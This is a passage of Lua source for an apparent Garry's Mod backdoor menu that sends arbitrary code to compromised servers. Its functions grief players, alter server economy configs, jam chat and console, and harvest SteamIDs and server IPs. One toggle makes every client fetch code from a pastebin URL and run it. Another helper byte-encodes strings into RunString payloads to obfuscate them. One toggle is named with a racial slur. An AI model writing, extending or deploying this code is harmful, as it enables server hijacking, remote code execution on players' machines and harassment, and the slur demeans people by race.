				for k,v in pairs(player.GetAll()) do
					v:SetColor(Color(255,255,255,255))
				end
			]])
			warped.nvidlog("Blueify All: Off!")
			Bluem = false
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)

  local pg = false
  warped.createbackdoor("[Toggle] Rainbow Player", "Tab4", function()
    if (!pg) then
      pg = true
      local HRBOW
      hook.Add("Think",HRBOW, function()
        local Rainbow = HSVToColor( CurTime() % 6 * 60, 1, 1 )
        LocalPlayer():SetWeaponColor( Vector( Rainbow.r / 255, Rainbow.g / 255, Rainbow.b / 255 ) )
        LocalPlayer():SetPlayerColor( Vector( Rainbow.r / 255, Rainbow.g / 255, Rainbow.b / 255 ) )
      end)
      warped.nvidlog("Rainbow Player: On!")
    else
      pg = false
      hook.Remove("Think",HRBOW)
      warped.nvidlog("Rainbow Player: Off!")
    end
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Open URL All", "Tab3", function()
    Derma_StringRequest("Open URL", "URL To Play:","",function(str)
      warped.sendlua([[
        for k,v in pairs(player.GetAll()) do
          v:SendLua("local gpwladfpaw = vgui.Create('DHTML') gpwladfpaw:SetSize(ScrW(),ScrH()) gpwladfpaw:Center() gpwladfpaw:MakePopup() gpwladfpaw:OpenURL(']]..str..[[')")
        end
      ]])
      warped.nvidlog("Opened URL: "..str)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("[Bitminer] Set Income", "Tab3", function()
    Derma_StringRequest("Bitminer Set Income", "Income To Set:", "", function(str)
      warped.sendlua("BM2CONFIG.BitcoinValue =" .. str)
      warped.nvidlog("Bitminer Income Set To: "..str)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Jam Console", "Tab3", function()
    warped.sendlua([[
      print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
    ]])
    warped.nvidlog("Console Was Jammed!")
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Jam Chat", "Tab3", function()
    warped.sendlua([[
      for i=1,99 do
        BroadcastLua("chat.AddText(Color(255,255,255), '')")
      end
    ]])
    warped.nvidlog("Chat Was Jammed!")
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Change Model", "Tab2", function()
    Derma_StringRequest("Change Model", "Model Directory:", "", function(str)
      warped.sendlua([[
        local me = Player(]]..plr..[[)
        me:SetModel("]]..str..[[")
      ]])
      warped.nvidlog("Player: "..Player(plr):Nick().." Player Model Was Set To: "..str)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Change All Models", "Tab3", function()
    Derma_StringRequest("Change All Models", "Model Directory:", "", function(str)
      warped.sendlua([[
        for k,v in pairs(player.GetAll()) do
          v:SetModel("]]..str..[[")
        end
      ]])
      warped.nvidlog("Everyones Model Was Set To: "..str)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Set Starting Money", "Tab3", function()
    Derma_StringRequest("Set Starting Money", "Money To Set: ", "", function(str)
      warped.sendlua([[
        GM.Config.startingmoney = ]]..str..[[
      ]])
      warped.nvidlog("Starting Money Set To: "..str)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  local eq = false
  warped.createbackdoor("[Toggle] Earthquake Mode", "Tab3", function()
    if (!eq) then
      eq = true
      warped.sendlua([[
        timer.Create("EQMODE",0.2,0,function()
          for k,v in pairs(player.GetAll()) do
            util.ScreenShake(v:GetPos(), 20, 1, 1, 100)
          end
        end)
      ]])
      warped.nvidlog("Earthquake Mode: On!")
    else
      eq = false
      warped.sendlua([[
        timer.Remove("EQMODE")
      ]])
      warped.nvidlog("Earthquake Mode: Off!")
    end
    surface.PlaySound("UI/buttonclick.wav")
  end)
  CreateSideButton("Copy Server Info", function()
    SetClipboardText(GetHostName().." | "..game.GetIPAddress().." | "..game.GetMap())
    warped.nvidlog("Server Info Copied!")
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("2d Player", "Tab2", function()
    warped.sendlua([[
      local v = Player(]]..plr..[[)
      local a = v:LookupBone("ValveBiped.Bip01_Head1")
      local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
      local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
      local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
      local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
      local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
      local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
      local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
      local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
      local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
      local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

      v:ManipulateBoneScale( a, Vector(4,0,4))
      v:ManipulateBoneScale( b, Vector(0,0,0))
      v:ManipulateBoneScale( c, Vector(0,0,0))
      v:ManipulateBoneScale( d, Vector(0,0,1))
      v:ManipulateBoneScale( e, Vector(0,0,1))
      v:ManipulateBoneScale( f, Vector(0,0,0))
      v:ManipulateBoneScale( g, Vector(0,0,0))
      v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
      v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
      v:ManipulateBoneScale( j, Vector(0,0,0))
      v:ManipulateBoneScale( k, Vector(0,0,0))
    ]])
    warped.nvidlog("Player: "..Player(plr):Nick().." Is Now 2d!")
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("2d All Players", "Tab1", function()
    warped.sendlua([[
      for k,v in pairs(player.GetAll()) do
        local a = v:LookupBone("ValveBiped.Bip01_Head1")
        local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
        local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
        local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
        local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
        local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
        local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
        local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
        local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
        local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
        local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4))
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
      end
    ]])
    warped.nvidlog("All Players Are Now 2d!")
    surface.PlaySound("UI/buttonclick.wav")
  end)
  local bctbl = {}
  CreateSideButton("Byte Encode String", function()
    Derma_StringRequest("Encode String", "String To Encode", "", function(str)
      local thing = str

      local encoded = thing:gsub(".", function(bb) return "\\" .. bb:byte() end) or thing .. "\""

      SetClipboardText("RunString('"..encoded.."')")
      warped.nvidlog("String Encoded, Check Clipboard!")
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Print Usergroups", "Tab3", function()
    warped.sendlua([[
      local you = Player(]]..LocalPlayer():UserID()..[[)
      for k,v in pairs(util.GetUserGroups()) do
        you:ChatPrint(v)
      end
    ]])
    warped.nvidlog("Usergroups Printed!")
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Copy Player Info", "Tab4", function()
    if plr ~= nil then
      local poo = Player(plr)
      SetClipboardText(poo:Nick().." | Distance: "..math.Round(LocalPlayer():GetPos():Distance(poo:GetPos())).." | usergroup: "..poo:GetUserGroup().." | Health: "..poo:Health().." | "..poo:SteamID())
      warped.nvidlog("Player Information Copied To Clipboard!")
      surface.PlaySound("UI/buttonclick.wav")
    else
      warped.nvidlog("No Player Selected!")
    end
  end)

  warped.createbackdoor("[Double] Set Jackpot", "Tab3", function()
    Derma_StringRequest("Double Or Nothing Jackpot", "Set Jackpot Winnings Min", "", function(st1)
      Derma_StringRequest("Double Or Nothing Jackpot", "Set Jackpot Winnings Max", "", function(st2)
        warped.sendlua([[
          BDON_CONFIG.minJackpot = ]]..st1..[[
          BDON_CONFIG.maxJackpot = ]]..st2..[[
        ]])
        warped.nvidlog("Double Or Nothing Min Set To: "..str1)
        warped.nvidlog("Double Or Nothing Max Set To: "..str2)
      end)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("[Double] Set Bet", "Tab3", function()
    Derma_StringRequest("Double Or Nothing Bet", "Set Bet For Double Or Nothing", "", function(str)
      warped.sendlua([[
        BDON_CONFIG.bet = ]]..str..[[
      ]])
      warped.nvidlog("Double Or Nothing Bet Set To: "..str)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  local nma = false
  warped.createbackdoor("[EPIC] Nigmode All", "Tab3", function()
    if (!nma) then
      warped.sendlua([[
        for k,v in pairs(player.GetAll()) do
          v:SendLua('sound.PlayURL("https://cdn.discordapp.com/attachments/731038072510349345/748507664182542356/NBA_YoungBoy_-_FREEDDAWG_Lyrics.mp3", "mono", function(station) if IsValid(station) then station:Play() end end)')
          v:SetColor(Color(0,0,0,255))
          v:SetModelScale(1.3)
          v:SetJumpPower(500)
          v:SetMaxSpeed(600)
          v:SetRunSpeed(600)
        end
      ]])
      nma = true
      warped.nvidlog("NigMode: On!")
    else
      warped.sendlua([[
        for k,v in pairs(player.GetAll()) do
          v:SetColor(Color(255,255,255,255))
          v:ConCommand("stopsound")
          v:SetModelScale(1)
          v:SetJumpPower(200)
          v:SetMaxSpeed(300)
          v:SetRunSpeed(300)
        end
      ]])
      nma = false
      warped.nvidlog("NigMode: Off!")
    end
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Change Name", "Tab2", function()
    Derma_StringRequest("Change Name", "Name To Change To:", "", function(str)
      warped.sendlua([[
        local str = "]]..str..[["
        local tar = Player(]]..plr..[[)
        DarkRP.storeRPName(tar, str)
        tar:setDarkRPVar("rpname", str)
      ]])
      warped.nvidlog("Player: "..Player(plr):Nick().." Had Their Name Changed To: "..str)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  uwu = false
  warped.createbackdoor("[EPIC] uwu Mode", "Tab3", function()
    if(!uwu) then
      warped.sendlua([[
        for k,v in pairs(player.GetAll()) do
          v:SendLua('sound.PlayURL("https://cdn.discordapp.com/attachments/741475338424680499/748851907585507378/y2mate.com_-_UwU___Montage_gdjAjpQq8pE.mp3", "mono", function(station) if IsValid(station) then station:Play() end end)')
          v:SendLua("hook.Add('HUDPaint', 'Rainbow', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 50)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
          BroadcastLua("http.Fetch('https://pastebin.com/raw/SfkaCfyT', function(body) RunString(body) end)")
          v:Give('weapon_gblaster_asriel_rainbow')
          v:SetModelScale(0.7)
          v:SetMaxSpeed(700)
          v:SetRunSpeed(700)
        end
        timer.Create("EQMODE",0.2,0,function()
          for k,v in pairs(player.GetAll()) do
            util.ScreenShake(v:GetPos(), 20, 1, 1, 100)
          end
        end)
      ]])
      uwu = true
      warped.nvidlog("uwu Mode: On!")
    else
      warped.sendlua([[
        for k,v in pairs(player.GetAll()) do
          v:ConCommand("stopsound")
          v:SendLua("hook.Remove('HUDPaint', 'Rainbow')")
          BroadcastLua("hook.Remove('PostDrawOpaqueRenderables','\xFFitsrainingchienchauds\xFF') hook.Remove('PostDrawOpaqueRenderables','\xFFitsrainingchienchauds2\xFF') timer.Remove('charglogo') timer.Remove('charglogo2')")
          timer.Remove("EQMODE")
          v:SetModelScale(1)
          v:SetMaxSpeed(300)
          v:SetRunSpeed(300)
        end
      ]])
      uwu = false
      warped.nvidlog("uwu Mode: Off!")
    end
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Flashlight Spammer", "Tab4", function()
    if(!flhack1) then
  		flhack1= true
      flhack()
      warped.nvidlog("Flashlight Hack: On!")
  	elseif(flhack1) then
  		flhack1 = false
  		hook.Remove("Tick", flhack2)
      warped.nvidlog("Flashlight Hack: Off!")
  	end
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Use Spammer", "Tab4", function()
    useS = !useS
    if(!useS) then
      LocalPlayer:ConCommand("-use")
      warped.nvidlog("Use Spammer: Off!")
    else
      warped.nvidlog("Use Spammer: On!")
    end
    surface.PlaySound("UI/buttonclick.wav")
  end)
end
warped.init()
